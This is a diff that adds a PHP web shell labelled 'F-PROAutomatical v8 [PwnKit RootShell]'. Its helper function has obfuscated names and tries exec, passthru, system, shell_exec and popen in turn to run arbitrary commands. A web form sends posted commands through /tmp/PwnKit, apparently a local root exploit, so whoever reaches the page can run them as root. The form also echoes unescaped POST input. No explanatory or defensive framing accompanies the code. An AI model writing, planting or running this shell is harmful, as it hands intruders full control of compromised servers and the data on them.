@@ -1,0 +1,40 @@
+<?php
+	function NfSsgu($KZPJs)
+	{
+	    $fSdcv = "\n";
+	    if (function_exists("exec")) {
+	        @exec($KZPJs, $fSdcv);
+	        $fSdcv = @join("
+	", $fSdcv);
+	    } elseif (function_exists("passthru")) {
+	        ob_start();
+	        @passthru($KZPJs);
+	        $fSdcv = ob_get_clean();
+	    } elseif (function_exists("system")) {
+	        ob_start();
+	        @system($KZPJs);
+	        $fSdcv = ob_get_clean();
+	    } elseif (function_exists("shell_exec")) {
+	        $fSdcv = shell_exec($KZPJs);
+	    } elseif (is_resource($dz0Ia = @popen($KZPJs, "r"))) {
+	        $fSdcv = "\n";
+	        fsX01:
+	        if (@feof($dz0Ia)) {
+	            pclose($dz0Ia);
+	        }
+	        $fSdcv .= fread($dz0Ia, 0x400);
+	        goto fsX01;
+	    }
+	    return $fSdcv;
+	}
+	
+error_reporting(0);
+
+echo '<b>F-PROAutomatical v8 [PwnKit RootShell].<b><br><br><form method="post">
+<input type="text" placeholder="command" name="pwn" value="'.$_POST['email'].'">
+<input type="submit" value="Execute">
+</form>
+<br>';
+if (!empty($_POST['pwn'])) {
+echo(NfSsgu('/tmp/PwnKit '.$_POST['pwn']));
+}
